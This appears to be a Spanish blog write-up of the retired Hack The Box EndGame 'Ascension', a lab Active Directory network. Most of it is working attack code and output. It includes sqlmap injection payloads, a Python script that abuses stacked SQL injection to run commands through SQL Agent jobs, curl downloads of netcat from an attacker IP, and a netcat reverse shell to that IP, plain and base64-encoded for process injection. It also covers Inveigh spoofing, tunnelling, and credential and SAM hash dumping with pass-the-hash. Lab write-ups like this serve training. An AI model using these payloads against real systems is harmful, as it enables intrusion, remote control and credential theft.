---
title: "EndGame - Ascension"
excerpt: "Se realizará un WriteUp del EndGame retirado Ascension que cuenta con máquinas Windows. Desarrollaremos cada una paso a paso con el fin de entender y profundizar en nuevos conceptos."
header:
  teaser: "/assets/images/ASCENSION - ENDGAME (1).gif"
categories:
  - WriteUp
---

<style>
  .teaser-img {
    width: auto; /* Ancho ajustado automáticamente */
    height: 200px; /* Altura de la imagen */
    max-width: 700%; /* Ancho máximo deseado */
    /* Puedes agregar más estilos si es necesario */
  }
</style>

<!-- Puedes usar HTML para la imagen y agregar una clase -->
<img src="{{ page.header.teaser }}" alt="Teaser image" class="teaser-img">

De comienzo tenemos la siguiente información:
```
Ascensión
Por egre55 y TRX

Daedalus Airlines se está convirtiendo rápidamente en un actor importante en la aviación mundial.

El ritmo de crecimiento ha hecho que la empresa haya acumulado mucha deuda técnica. Para evitar una violación de datos y poner en riesgo su cadena de suministro, Daedalus ha contratado a su empresa de seguridad cibernética para probar sus sistemas.

Ascension está diseñado para poner a prueba sus habilidades en enumeración, explotación, pivotación, recorrido de bosque y escalada de privilegios dentro de dos pequeñas redes de Active Directory.

El objetivo es obtener acceso al socio de confianza, moverse a través de la red y comprometer dos bosques de Active Directory mientras recopila varias banderas en el camino. ¿Puedes Ascender?

Punto de entrada: 10.13.38.20
```

Además sabemos que consta de las siguientes maquinas a tener en cuenta:

![](/assets/images/image-1.png)

La exploración inicial de la máquina mediante la herramienta Nmap reveló que solo un puerto se encontraba activo, específicamente el puerto 80, el cual estaba asociado con un servicio web bajo el protocolo HTTP.

Tras identificar el servicio web, procedimos a examinar su contenido, el cual se asemejaba a una página perteneciente a una aerolínea. En dicho sitio, localizamos un botón destinado a la reserva de vuelos.

Al acceder a la página de reservas, se nos permitió ingresar datos relacionados con posibles vuelos. Durante la prueba de entrada de datos, al insertar una comilla simple ('), se generó un error atribuido al sistema de gestión de bases de datos MS SQL. Esta situación sugiere la posibilidad de una vulnerabilidad por inyección SQL, la cual podría ser explotada aprovechando dicho error.

Con el fin de optimizar el proceso y ahorrar tiempo, decidimos emplear la herramienta SQLmap. Inicializamos el escaneo proporcionándole la información relativa al campo que mostró la vulnerabilidad. Utilizando el parámetro "-dbs", procedimos a extraer los nombres de todas las bases de datos disponibles. No obstante, la exploración no arrojó resultados de particular relevancia en dichas bases de datos.

```bash
❯ sqlmap --batch --url http://10.13.38.20/book-trip.php --data "destination=test" -dbs
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[18:18:36] [INFO] resuming back-end DBMS 'microsoft sql server' 
[18:18:36] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: destination (POST)
    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: destination=test' AND 5908 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(107)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (5908=5908) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(106)+CHAR(113)))-- OSNd  

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: destination=test';WAITFOR DELAY '0:0:5'--

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: destination=test' WAITFOR DELAY '0:0:5'-- DCiP
---
[18:18:37] [INFO] the back-end DBMS is Microsoft SQL Server
[18:18:37] [INFO] fetching database names
[18:18:38] [INFO] retrieved: 'daedalus'
[18:18:39] [INFO] retrieved: 'logs'
[18:18:39] [INFO] retrieved: 'master'
[18:18:40] [INFO] retrieved: 'model'
[18:18:40] [INFO] retrieved: 'msdb'
[18:18:41] [INFO] retrieved: 'tempdb'
available databases [6]:
[*] daedalus
[*] logs
[*] master
[*] model
[*] msdb
[*] tempdb
```

  
Mediante el parámetro "--users" de SQLmap, es posible extraer los usuarios asociados a la base de datos, permitiéndonos así obtener información adicional relevante.

Además, para ejecutar consultas personalizadas y tener un mayor control sobre las operaciones realizadas, optaremos por utilizar el parámetro "--sql-shell". Este parámetro nos proporcionará una interfaz de consola que nos permitirá enviar consultas SQL de manera directa, brindando así un mayor nivel de control sobre las acciones ejecutadas en el sistema de gestión de bases de datos

```bash
❯ sqlmap --batch --url http://10.13.38.20/book-trip.php --data "destination=test" --users  
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[14:24:47] [INFO] resuming back-end DBMS 'microsoft sql server' 
[14:24:47] [INFO] testing connection to the target URL
[14:24:48] [INFO] the back-end DBMS is Microsoft SQL Server
[14:24:48] [INFO] fetching database user'
database management system users [18]:
[*] ##MS_AgentSigningCertificate##
[*] ##MS_PolicyEventProcessingLogin##
[*] ##MS_PolicySigningCertificate##
[*] ##MS_PolicyTsqlExecutionLogin##
[*] ##MS_SmoExtendedSigningCertificate##
[*] ##MS_SQLAuthenticatorCertificate##
[*] ##MS_SQLReplicationSigningCertificate##
[*] ##MS_SQLResourceSigningCertificate##
[*] daedalus
[*] daedalus_admin
[*] NT AUTHORITY\\SYSTEM
[*] NT Service\\MSSQLSERVER
[*] NT SERVICE\\SQLSERVERAGENT
[*] NT SERVICE\\SQLTELEMETRY
[*] NT SERVICE\\SQLWriter
[*] NT SERVICE\\Winmgmt
[*] sa
[*] WEB01\\svc_dev
```

```bash
❯ sqlmap --batch --url http://10.13.38.20/book-trip.php --data "destination=test" --sql-shell
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[18:19:09] [INFO] resuming back-end DBMS 'microsoft sql server' 
[18:19:09] [INFO] testing connection to the target URL
[18:19:10] [INFO] the back-end DBMS is Microsoft SQL Server
[18:19:10] [INFO] calling Microsoft SQL Server shell. To quit type 'x' or 'q' and press ENTER  
sql-shell> select suser_name();
[18:22:19] [INFO] fetching SQL SELECT statement query output: 'select suser_name()'
[18:22:20] [INFO] retrieved: 'daedalus'
select suser_name(): 'daedalus'
sql-shell> host_name();
[18:25:12] [INFO] fetching SQL query output: 'host_name()'
[18:25:12] [INFO] retrieved: 'WEB01'
host_name(): 'WEB01'
sql-shell>
```

Después de crear la tabla "roles" con las columnas "username" y "rolename", procedimos a ingresar los nombres y roles de los miembros de la base de datos, siguiendo la documentación relevante. Una vez completada esta tarea, realizamos un volcado de la tabla "roles" para examinar la información obtenida.

Durante la inspección de los datos, identificamos a "daedalus_admin" con el rol "SQLAgentUserRole". Según la documentación pertinente, este rol confiere al usuario la capacidad de crear y ejecutar trabajos dentro del sistema.

```sql
sql-shell> create table roles ([username] sysname, [rolename] sysname)
[14:35:33] [INFO] executing SQL data definition statement: 'create table roles ([username] sysname, [rolename] sysname)'
create table roles ([username] sysname, [rolename] sysname): 'NULL'
sql-shell> insert into roles (username, rolename) select isnull (dp1.name, 'no members') as databaseusername, dp2.name as databaserolename from msdb.sys.database_role_members as drm left outer join msdb.sys.database_principals as dp1 on drm.member_principal_id = dp1.principal_id right outer join msdb.sys.database_principals as dp2 on drm.role_principal_id = dp2.principal_id where dp2.type = 'r' order by dp1.name
[14:35:34] [INFO] executing SQL data manipulation statement: 'insert into roles (username, rolename) select isnull (dp1.name, 'no members') as databaseusername, dp2.name as databaserolename from msdb.sys.database_role_members as drm left outer join msdb.sys.database_principals as dp1 on drm.member_principal_id = dp1.principal_id right outer join msdb.sys.database_principals as dp2 on drm.role_principal_id = dp2.principal_id where dp2.type = 'r' order by dp1.name'  
insert into roles (username, rolename) select isnull (dp1.name, 'no members') as databaseusername, dp2.name as databaserolename from msdb.sys.database_role_members as drm left outer join msdb.sys.database_principals as dp1 on drm.member_principal_id = dp1.principal_id right outer join msdb.sys.database_principals as dp2 on drm.role_principal_id = dp2.principal_id where dp2.type = 'r' order by dp1.name: 'NULL'
sql-s
```

Tras completar la inserción de datos en la tabla "roles", procedimos a realizar un volcado de la misma para examinar su contenido. Durante este proceso de revisión, identificamos que el usuario "daedalus_admin" estaba asociado al rol "SQLAgentUserRole". De acuerdo con la documentación relevante, este rol otorga al usuario la capacidad de crear y ejecutar trabajos (jobs) dentro del sistema de gestión de bases de datos.

```bash
❯ sqlmap --batch --url http://10.13.38.20/book-trip.php --data "destination=test" -D daedalus -T roles -dump  
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Database: daedalus
Table: roles
[39 entries]
+------------------------------+-----------------------------------+
| rolename                     | username                          |
+------------------------------+-----------------------------------+
| public                       | No members                        |
| TargetServersRole            | No members                        |
| SQLAgentUserRole             | SQLAgentReaderRole                |
| SQLAgentUserRole             | dc_operator                       |
| SQLAgentUserRole             | MS_DataCollectorInternalUser      |
| SQLAgentUserRole             | daedalus_admin                    |
| SQLAgentUserRole             | WEB01\\svc_dev                    |
| SQLAgentReaderRole           | SQLAgentOperatorRole              |
| SQLAgentReaderRole           | daedalus_admin                    |
| SQLAgentReaderRole           | WEB01\\svc_dev                    |
| SQLAgentOperatorRole         | PolicyAdministratorRole           |
| SQLAgentOperatorRole         | daedalus_admin                    |
| SQLAgentOperatorRole         | WEB01\\svc_dev                    |
| DatabaseMailUserRole         | No members                        |
| db_ssisadmin                 | No members                        |
| db_ssisltduser               | dc_operator                       |
| db_ssisltduser               | dc_proxy                          |
| db_ssisoperator              | dc_operator                       |
| db_ssisoperator              | dc_proxy                          |
| db_ssisoperator              | MS_DataCollectorInternalUser      |
| dc_operator                  | dc_admin                          |
| dc_admin                     | MS_DataCollectorInternalUser      |
| dc_proxy                     | No members                        |
| PolicyAdministratorRole      | ##MS_PolicyEventProcessingLogin## |
| PolicyAdministratorRole      | ##MS_PolicyTsqlExecutionLogin##   |
| ServerGroupAdministratorRole | No members                        |
| ServerGroupReaderRole        | ServerGroupAdministratorRole      |
| UtilityCMRReader             | No members                        |
| UtilityIMRWriter             | No members                        |
| UtilityIMRReader             | UtilityIMRWriter                  |
| db_owner                     | dbo                               |
| db_accessadmin               | No members                        |
| db_securityadmin             | No members                        |
| db_ddladmin                  | No members                        |
| db_backupoperator            | No members                        |
| db_datareader                | No members                        |
| db_datawriter                | No members                        |
| db_denydatareader            | No members                        |
| db_denydatawriter            | No members                        |
+------------------------------+-----------------------------------+
```
  
Para enumerar los usuarios a los que nuestro usuario actual puede suplantar, llevaremos a cabo la creación de una tabla llamada "grants", en la cual almacenaremos los nombres de usuario pertinentes. Este proceso puede ser facilitado utilizando un artículo que nos proporciona una guía detallada sobre la enumeración de usuarios a suplantar.

```sql
sql-shell> create table grants (username varchar(1024))
[14:39:19] [INFO] executing SQL data definition statement: 'create table grants (username varchar(1024))'
create table grants (username varchar(1024)): 'NULL'
sql-shell> insert into grants (username) select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate'
[14:39:30] [INFO] executing SQL data manipulation statement: 'insert into grants (username) select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate''  
insert into grants (username) select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate': 'NULL'
```

Luego de realizar el volcado de la tabla "proxy", pudimos identificar las credenciales de "svc_dev", que en su descripción indicaban tener acceso para ejecutar "CmdExec" y "Powershell". Con base en esta investigación, podemos elaborar un pequeño script en Python que automatice la ejecución de comandos exclusivamente a través de trabajos (jobs), aprovechando los privilegios del usuario "daedalus_admin" que hemos suplantado.

```bash
❯ sqlmap --batch --url http://10.13.38.20/book-trip.php --data "destination=test" -D daedalus -T proxy -dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Database: daedalus
Table: proxy
[1 entry]
+----------+-------------------+---------------+---------+---------+-------------------------------------------------------------+---------------------+----------------------------+
| proxy_id | user_sid          | credential_id | name    | enabled | description                                                 | credential_identity | credential_identity_exists |
+----------+-------------------+---------------+---------+---------+-------------------------------------------------------------+---------------------+----------------------------+
| 1        | ?..?\x15.???????. | 65537         | svc_dev | 1       | Allow user to access the CmdExec and Powershell subsystems. | WEB01\\svc_dev      | 1                          |
+----------+-------------------+---------------+---------+---------+-------------------------------------------------------------+---------------------+----------------------------+  
```

```python
#!/usr/bin/python3
# Shebang: indica al sistema operativo que este script debe ser ejecutado utilizando Python 3

import sys, random, string, requests
# Importación de los módulos necesarios: sys para interactuar con el intérprete de Python,
# random para generar valores aleatorios,
# string para operaciones de cadena y
# requests para realizar solicitudes HTTP.

if len(sys.argv) < 2:
    # Verifica si se proporciona al menos un argumento en la línea de comandos al ejecutar el script.
    print(f"Usage: python3 {sys.argv[0]} <command>")
    sys.exit(1)  # Sale del script con un código de salida 1 (indicando un error).

command = sys.argv[1]
# Obtiene el comando que se pasó como argumento al script.

target = "http://10.13.38.20/book-trip.php"
# Establece el objetivo al que se realizarán las solicitudes. Parece ser una URL.

name = "".join(random.choices(string.ascii_lowercase, k=8))
# Genera un nombre aleatorio de 8 caracteres utilizando letras minúsculas del alfabeto inglés.

query = f"""
use msdb;
exec as login = N'daedalus_admin';
exec msdb.dbo.sp_add_job @job_name = N'{name}_job';
exec msdb.dbo.sp_add_jobstep @job_name = N'{name}_job', @step_name = N'{name}_step', @subsystem = N'cmdexec', @command = N'C:\\Windows\\System32\\cmd.exe /c {command}', @retry_attempts = 1, @retry_interval = 5, @proxy_id = 1;  
exec msdb.dbo.sp_add_jobserver @job_name = N'{name}_job';
exec msdb.dbo.sp_start_job @job_name = N'{name}_job';
"""
# Construye una consulta SQL para ejecutar en la base de datos del destino.
# La consulta parece estar diseñada para agregar un trabajo (job) en la base de datos MSDB de SQL Server,
# con el objetivo de ejecutar un comando proporcionado como argumento.

data = {"destination": f"'; {query}-- -"}
# Construye un diccionario con una clave "destination" y un valor que parece ser una inyección SQL.
# La parte interesante aquí es que la inyección SQL se hace utilizando el valor de query,
# que es el comando construido anteriormente.
# El --; - al final es para comentar el resto de la consulta SQL original y evitar errores.

requests.post(target, data=data)
# Realiza una solicitud HTTP POST al objetivo con los datos proporcionados.
```

Vamos a realizar una comprobación. 

```bash
❯ python3 exploit.py 'curl 10.10.14.6'  
```

```bash
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
10.13.38.20 - - "GET / HTTP/1.1" 200 -
```

  
Nuestro objetivo es obtener acceso al sistema. Para lograrlo, comenzamos descargando el ejecutable netcat.exe en la ubicación C:\ProgramData, la cual es una ruta que todos los usuarios tienen permisos de escritura.

Utilizamos un script en Python llamado exploit.py para realizar la descarga del netcat.exe. Este script utiliza el comando curl para descargar el archivo desde una ubicación remota (10.10.14.10/netcat.exe) y lo guarda en C:\ProgramData\netcat.exe en el sistema comprometido.

Posteriormente, configuramos un servidor HTTP local utilizando el comando sudo python3 -m http.server 80 para servir el archivo netcat.exe.

Una vez que el archivo netcat.exe fue descargado con éxito en el sistema comprometido, procedimos a llamar a netcat.exe y establecer una conexión utilizando PowerShell. Esta conexión fue recibida en la máquina web01, utilizando las credenciales del usuario svc_dev. Como resultado, pudimos acceder y leer la primera flag.

```bash
❯ python3 exploit.py 'curl 10.10.14.6/netcat.exe -o C:\ProgramData\netcat.exe'  
```

```bash
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
10.13.38.20 - - "GET /netcat.exe HTTP/1.1" 200 -
```

```bash
❯ python3 exploit.py 'cmd /c C:\ProgramData\netcat.exe -e powershell 10.10.14.10 443'  
```

```bash
❯ sudo netcat -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.38.20
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.  

PS C:\Windows\System32> whoami
web01\svc_dev
PS C:\Windows\System32> type C:\Users\svc_dev\Desktop\flag.txt  
ASCENSION{********************}
PS C:\Windows\System32>
```
Empleamos Inveigh para monitorear el tráfico de todas las solicitudes realizadas en la red. En el resultado obtenido, se identificaron algunas solicitudes dirigidas hacia fin01.daedalus.local.

```powershell
PS C:\ProgramData> curl 10.10.14.10/Inveigh.ps1 -o Inveigh.ps1
PS C:\ProgramData> Import-Module .\Inveigh.ps1
PS C:\ProgramData> Invoke-Inveigh -FileOutput Y
[*] Inveigh 1.506 started at 2023-09-02T22:06:41
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 10.13.38.20
[+] Spoofer IP Address = 10.13.38.20
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer = Disabled
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Disabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Disabled
[+] File Output = Enabled
[+] Output Directory = C:\ProgramData
Warning: [!] Run Stop-Inveigh to stop
PS C:\ProgramData> type Inveigh-Log.txt
[+] [2023-09-02T22:06:49] mDNS(QM) request fin01.local received from 10.13.38.20 [spoofer disabled]
[+] [2023-09-02T22:06:49] mDNS(QM) request fin01.local received from 10.13.38.20 [spoofer disabled]
[+] [2023-09-02T22:06:50] NBNS request for FIN01<20> received from 192.168.10.39 [spoofer disabled]
[+] [2023-09-02T22:06:50] NBNS request for FIN01<20> received from 192.168.10.39 [spoofer disabled]
[+] [2023-09-02T22:06:50] DNS request for fin01.daedalus.local sent to 192.168.10.6 [outgoing query]  
PS C:\ProgramData>
```

Es posible que estemos frente a una tarea específica, y aunque contamos con la herramienta Seatbelt para enumerar tareas, primero necesitamos migrar a un proceso. Para ello, procedemos a importar Invoke-PSInject.

```powershell
PS C:\ProgramData> curl 10.10.14.6/Invoke-PSInject.ps1 -o Invoke-PSInject.ps1  
PS C:\ProgramData> Import-Module .\Invoke-PSInject.ps1
PS C:\ProgramData>
```

A continuación, seleccionaremos un proceso al cual migrar. En este caso, optamos por utilizar RunTimeBroker.

```powershell
PS C:\ProgramData> Get-Process RunTimeBroker

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    276      14     3348      15672       0.53   4992   1 RuntimeBroker  
    341      18    20332      33492       2.02   5952   1 RuntimeBroker  
    145       8     1764       7820       0.13   8184   1 RuntimeBroker  

PS C:\ProgramData>
```

Posteriormente, procederemos a crear un payload en base64 que aproveche el uso de Netcat para enviar una reverse shell.

```bash
❯ echo -n 'cmd /c C:\\ProgramData\\netcat.exe -e powershell 10.10.14.10 443' | iconv -t utf16le | base64 -w0
YwBtAGQAIAAvAGMAIABDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABuAGUAdABjAGEAdAAuAGUAeABlACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAAgADEAMAAuADEAMAAuADEANAAuADQAIAA0ADQAMwA=  
```

Tras ejecutar nuestro payload en base64 en el proceso con ID 4992, perteneciente al proceso RunTimeBroker, se ha iniciado una nueva instancia de PowerShell.

```powershell
PS C:\ProgramData> Invoke-PSInject -Procid 4992 -PoshCode YwBtAGQAIAAvAGMAIABDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABuAGUAdABjAGEAdAAuAGUAeABlACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAAgADEAMAAuADEAMAAuADEANAAuADQAIAA0ADQAMwA=  
PS C:\ProgramData>
```

Posteriormente, se inició un servidor Netcat en espera de conexiones en el puerto 443. Una vez recibida una conexión, se estableció una nueva sesión de PowerShell en el sistema comprometido. Bajo este contexto, pudimos identificar que el usuario actual es "svc_dev" en la máquina "web01".

```powershell
❯ sudo netcat -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.38.20
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.  

PS C:\Windows\System32> whoami
web01\svc_dev
PS C:\Windows\System32>
```

Dentro de este contexto, podemos proceder a enumerar las tareas utilizando Seatbelt. Durante la enumeración, se identificó una tarea llamada AutochkTask que intenta cargar contenido desde \\fin01\invoices. Sin embargo, en el propio comando se muestran credenciales, lo que representa una posible vulnerabilidad de seguridad.

```powershell
PS C:\ProgramData> curl 10.10.14.10/Seatbelt.exe -o Seatbelt.exe
PS C:\ProgramData> .\Seatbelt.exe ScheduledTasks


                        %&&@@@&&                                                                                  
                        &&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%                         
                        &%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%  
%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((  
#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((  
#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((  
#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((  
#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####  
###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####  
#####%######################  %%%..                       @////(((&%%%%%%%################                        
                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,                                 
                         #%%%%##,                                                                                 

====== ScheduledTasks ======

Non Microsoft scheduled tasks (via WMI)

  Name                              :   Server Initial Configuration Task
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   $(@%systemroot%\system32\SrvInitConfig.exe,-100)
  Description                       :   $(@%systemroot%\system32\SrvInitConfig.exe,-101)
  Source                            :   
  State                             :   Disabled
  SDDL                              :   
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /disableconfigtask
      Execute                       :   %windir%\system32\srvinitconfig.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   AutochkTask
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   1
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   svc_dev
  Author                            :   DAEDALUS\Administrator
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/3/2020 3:34:29 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   net use E: \\fin01\invoices /user:billing_user D43d4lusB1ll1ngB055
      Execute                       :   powershell
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2020-01-13T04:13:47
      Interval                      :   PT1M
      StopAtDurationEnd             :   False
      ------------------------------

PS C:\ProgramData>
```

Antes de continuar, estableceremos un proxy para facilitar la conexión con los equipos dentro del dominio. Utilizaremos Ligolo-ng con el agente para conectarnos a nuestro equipo a través del puerto 8888, que especificaremos en el proxy.

```powershell
PS C:\ProgramData> curl 10.10.14.6/agent.exe -o agent.exe
PS C:\ProgramData> .\agent.exe -connect 10.10.14.6:8888 -ignore-cert  
```

Una vez ejecutado el agente, obtendremos una sesión en el proxy. Indicamos esta sesión y luego iniciamos el túnel con el comando start.

```bash
❯ ,/proxy -selfcert -laddr 0.0.0.0:8888
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:8888                    
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

Made in France ♥ by @Nicocha30!

ligolo-ng » 
INFO[0076] Agent joined.           name="WEB01\\svc_dev@WEB01" remote="10.13.38.20:59528"  
ligolo-ng » session
? Specify a session : 1 - WEB01\svc_dev@WEB01 - 10.13.38.20:59528
[Agent : WEB01\svc_dev@WEB01] » start
INFO[0081] Starting tunnel to WEB01\svc_dev@WEB01       
[Agent : WEB01\svc_dev@WEB01] »
```

Después de agregar el segmento 192.168.10.0/24 a la interfaz de Ligolo, confirmamos la conectividad con todos los equipos del dominio realizando un ping a una dirección específica en ese rango.

```bash
❯ sudo ip route add 192.168.10.0/24 dev ligolo

❯ ping -c1 -w1 192.168.10.39
PING 192.168.10.39 (192.168.10.39) 56(84) bytes of data.
64 bytes from 192.168.10.39: icmp_seq=1 ttl=64 time=177 ms

--- 192.168.10.39 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms  
rtt min/avg/max/mdev = 176.552/176.552/176.552/0.000 ms
```

Luego, utilizando CrackMapExec, realizamos un escaneo del segmento /24 para detectar los equipos asociados al dominio "daedalus.local". Se encontraron dos equipos, WEB01 y DC1.

```bash
❯ crackmapexec smb 192.168.10.0/24
SMB         192.168.10.39   445    WEB01            [*] Windows Server 2019 Standard 17763 x64 (name:WEB01) (domain:daedalus.local) (signing:False) (SMBv1:True)  
SMB         192.168.10.6    445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)
```

Para facilitar futuras acciones y ataques, añadimos las direcciones IP y sus respectivos nombres de dominio al archivo /etc/hosts.

```bash
❯ echo "192.168.10.39 web01.daedalus.local" | sudo tee -a /etc/hosts
❯ echo "192.168.10.6 daedalus.local dc1.daedalus.local" | sudo tee -a /etc/hosts  
```

Posteriormente, confirmamos que las credenciales obtenidas en la tarea hacia el controlador de dominio (DC1) son válidas.

```bash
❯ crackmapexec smb dc1.daedalus.local -u billing_user -p D43d4******ngB055
SMB         daedalus.local  445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)  
SMB         daedalus.local  445    DC1              [+] daedalus.local\billing_user:D43d********1ngB055
```

Finalmente, al examinar los administradores locales en WEB01, descubrimos que el usuario "billing_user" es miembro del grupo de administradores a nivel de dominio. Esta cuenta de usuario tiene la misma contraseña que se obtuvo anteriormente.

```powershell
PS C:\ProgramData> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain  

Members

-------------------------------------------------------------------------------
Administrator
DAEDALUS\billing_user
DAEDALUS\Domain Admins
The command completed successfully.
```

Al utilizar CrackMapExec nuevamente, pero esta vez hacia WEB01, se confirmó que se tiene acceso con privilegios máximos ("Pwn3d!"). Por lo tanto, se puede proceder a realizar el volcado de la SAM (Security Accounts Manager).

```bash
❯ crackmapexec smb web01.daedalus.local -u billing_user -p D43d4******ngB055
SMB         web01.daedalus.local 445    WEB01            [*] Windows Server 2019 Standard 17763 x64 (name:WEB01) (domain:daedalus.local) (signing:False) (SMBv1:True)  
SMB         web01.daedalus.local 445    WEB01            [+] daedalus.local\billing_user:D43d4******ngB055 (Pwn3d!)

❯ crackmapexec smb web01.daedalus.local -u billing_user -p D43d4******ngB055 --sam
SMB         web01.daedalus.local 445    WEB01            [*] Windows Server 2019 Standard 17763 x64 (name:WEB01) (domain:daedalus.local) (signing:False) (SMBv1:True)  
SMB         web01.daedalus.local 445    WEB01            [+] daedalus.local\billing_user:D43d4******ngB055 (Pwn3d!)
SMB         web01.daedalus.local 445    WEB01            [*] Dumping SAM hashes
SMB         web01.daedalus.local 445    WEB01            Administrator:500:aad3********************9511b9a10d7d026322e8521:::
SMB         web01.daedalus.local 445    WEB01            Guest:501:aad3b435b514**********************fe0d16ae931b73c59d7e0c089c0:::
SMB         web01.daedalus.local 445    WEB01            DefaultAccount:503:aa****************************e0c089c0:::
SMB         web01.daedalus.local 445    WEB01            WDAGUtilityAccount:504:aad3b****************************5ffc477a12c27bea2:::
SMB         web01.daedalus.local 445    WEB01            svc_dev:1003:aad3b435b*****************************888169ce31d0b80ce67114a74e:::
SMB         web01.daedalus.local 445    WEB01            [+] Added 5 SAM hashes to the database
```

Utilizando el hash del usuario Administrator, logramos conectarnos con Evil-WinRM utilizando el método passthehash. Una vez autenticados, obtenemos una sesión de PowerShell donde verificamos la identidad del usuario actual y leemos el contenido de la bandera ubicada en el escritorio.

```powershell
❯ evil-winrm -i web01.daedalus.local -u Administrator -H ******************  
PS C:\Users\Administrator\Documents> whoami
web01\administrator
PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
ASCENSION{**************}
PS C:\Users\Administrator\Documents>
```
